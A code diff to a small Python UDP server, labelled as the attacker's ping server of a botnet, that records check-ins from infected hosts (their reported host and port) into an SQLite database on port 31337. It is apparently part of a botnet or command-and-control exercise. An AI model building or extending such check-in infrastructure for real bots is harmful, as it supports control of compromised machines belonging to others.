@@ -1,9 +1,13 @@
+import json
 import logging
-import socketserver
 import sqlite3
+from socketserver import ThreadingUDPServer, BaseRequestHandler
+from datetime import datetime, timezone
+
 
 HOST = 'localhost'
 PORT = 31337
+DATABASE = 'botnet.sqlite3'
 
 
 logging.basicConfig(
@@ -12,14 +16,31 @@ logging.basicConfig(
 log = logging.getLogger('botnet.attacker.ping_server')
 
 
-class UDPHandler(socketserver.BaseRequestHandler):
+with sqlite3.connect('botnet.sqlite3') as db:
+    db.execute("""
+        CREATE TABLE IF NOT EXISTS ping (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            datetime DATETIME,
+            host TEXT,
+            port INTEGER)""")
+
+
+class UDPHandler(BaseRequestHandler):
     def handle(self):
-        log.info(f'Received ping from {self.client_address}')
-        # add to sqlite3 database
+        host, port = self.client_address
+        data = json.loads(self.request[0])
+        log.info(f'Received ping from {host}:{port}/UDP')
+
+        with sqlite3.connect('botnet.sqlite3') as db:
+            db.execute('INSERT INTO ping VALUES (NULL, :datetime, :host, :port)', {
+                'datetime': datetime.now(tz=timezone.utc),
+                'host': data['host'],
+                'port': data['port'],
+            })
 
 
 if __name__ == '__main__':
-    log.info(f'Listening for pings on {HOST}:{PORT}...')
+    log.info(f'Listening for pings on {HOST}:{PORT}/UDP...')
 
-    listener = socketserver.UDPServer((HOST, PORT), UDPHandler)
+    listener = ThreadingUDPServer((HOST, PORT), UDPHandler)
     listener.serve_forever()
